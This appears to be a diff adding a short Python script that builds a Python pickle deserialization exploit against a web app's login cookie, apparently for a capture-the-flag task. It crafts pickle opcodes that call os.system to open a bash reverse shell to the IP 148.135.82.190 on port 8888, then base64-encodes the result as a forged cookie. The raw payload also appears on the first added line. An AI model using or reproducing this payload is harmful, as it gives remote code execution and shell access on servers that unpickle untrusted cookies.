@@ -1,0 +1,18 @@
+\x80\x04\x95,\x00\x00\x00\x00\x00\x00\x00\x8c\x03app\x94\x8c\x05Login\x94\x93\x94)\x81\x94}\x94(\x8c\x04name\x94\x8c\x011\x94\x8c\x03pwd\x94h\x06ub(S'bash -c "bash -i >& /dev/tcp/148.135.82.190/8888 0>&1"'\nios\nsystem\n.
+import pickle
+
+import base64
+
+import pickletools
+
+cookie="gASVLAAAAAAAAACMA2FwcJSMBUxvZ2lulJOUKYGUfZQojARuYW1llIwBMZSMA3B3ZJRoBnViLg=="
+
+print(base64.b64decode(cookie))
+
+import base64
+
+#bash -c "bash -i >& /dev/tcp/148.135.82.190/8888 0>&1"
+
+opcode=b'''\x80\x04\x95,\x00\x00\x00\x00\x00\x00\x00\x8c\x03app\x94\x8c\x05Login\x94\x93\x94)\x81\x94}\x94(\x8c\x04name\x94\x8c\x011\x94\x8c\x03pwd\x94h\x06ub(S'bash -c "bash -i >& /dev/tcp/148.135.82.190/8888 0>&1"'\nios\nsystem\n.'''
+
+print(base64.b64encode(opcode))
